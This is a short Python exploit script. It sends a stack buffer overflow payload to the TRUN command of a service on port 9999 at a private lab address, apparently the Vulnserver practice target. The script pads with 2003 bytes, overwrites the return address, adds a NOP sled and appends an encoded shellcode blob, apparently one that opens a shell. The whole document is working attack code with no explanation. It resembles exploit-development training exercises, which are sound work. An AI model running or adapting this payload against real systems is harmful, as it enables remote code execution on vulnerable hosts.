#!/usr/bin/python3

import sys, socket
from time import sleep

overflow = (b"\xb8\x5c\x1e\x35\x96\xd9\xc6\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
b"\x52\x31\x43\x12\x03\x43\x12\x83\x9f\x1a\xd7\x63\xe3\xcb\x95"
b"\x8c\x1b\x0c\xfa\x05\xfe\x3d\x3a\x71\x8b\x6e\x8a\xf1\xd9\x82"
b"\x61\x57\xc9\x11\x07\x70\xfe\x92\xa2\xa6\x31\x22\x9e\x9b\x50"
b"\xa0\xdd\xcf\xb2\x99\x2d\x02\xb3\xde\x50\xef\xe1\xb7\x1f\x42"
b"\x15\xb3\x6a\x5f\x9e\x8f\x7b\xe7\x43\x47\x7d\xc6\xd2\xd3\x24"
b"\xc8\xd5\x30\x5d\x41\xcd\x55\x58\x1b\x66\xad\x16\x9a\xae\xff"
b"\xd7\x31\x8f\xcf\x25\x4b\xc8\xe8\xd5\x3e\x20\x0b\x6b\x39\xf7"
b"\x71\xb7\xcc\xe3\xd2\x3c\x76\xcf\xe3\x91\xe1\x84\xe8\x5e\x65"
b"\xc2\xec\x61\xaa\x79\x08\xe9\x4d\xad\x98\xa9\x69\x69\xc0\x6a"
b"\x13\x28\xac\xdd\x2c\x2a\x0f\x81\x88\x21\xa2\xd6\xa0\x68\xab"
b"\x1b\x89\x92\x2b\x34\x9a\xe1\x19\x9b\x30\x6d\x12\x54\x9f\x6a"
b"\x55\x4f\x67\xe4\xa8\x70\x98\x2d\x6f\x24\xc8\x45\x46\x45\x83"
b"\x95\x67\x90\x04\xc5\xc7\x4b\xe5\xb5\xa7\x3b\x8d\xdf\x27\x63"
b"\xad\xe0\xed\x0c\x44\x1b\x66\xf3\x31\x27\x31\x9b\x43\x27\xac"
b"\x07\xcd\xc1\xa4\xa7\x9b\x5a\x51\x51\x86\x10\xc0\x9e\x1c\x5d"
b"\xc2\x15\x93\xa2\x8d\xdd\xde\xb0\x7a\x2e\x95\xea\x2d\x31\x03"
b"\x82\xb2\xa0\xc8\x52\xbc\xd8\x46\x05\xe9\x2f\x9f\xc3\x07\x09"
b"\x09\xf1\xd5\xcf\x72\xb1\x01\x2c\x7c\x38\xc7\x08\x5a\x2a\x11"
b"\x90\xe6\x1e\xcd\xc7\xb0\xc8\xab\xb1\x72\xa2\x65\x6d\xdd\x22"
b"\xf3\x5d\xde\x34\xfc\x8b\xa8\xd8\x4d\x62\xed\xe7\x62\xe2\xf9"
b"\x90\x9e\x92\x06\x4b\x1b\xb2\xe4\x59\x56\x5b\xb1\x08\xdb\x06"
b"\x42\xe7\x18\x3f\xc1\x0d\xe1\xc4\xd9\x64\xe4\x81\x5d\x95\x94"
b"\x9a\x0b\x99\x0b\x9a\x19")

shellcode = b"A" * 2003 + b"\xaf\x11\x50\x62" + b"\x90" * 16 + overflow

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.4.104',9999))

	payload = b"TRUN /.:/" + shellcode

	s.send((payload))
	s.close()
except:
	print ("Error connecting to server")
	sys.exit()
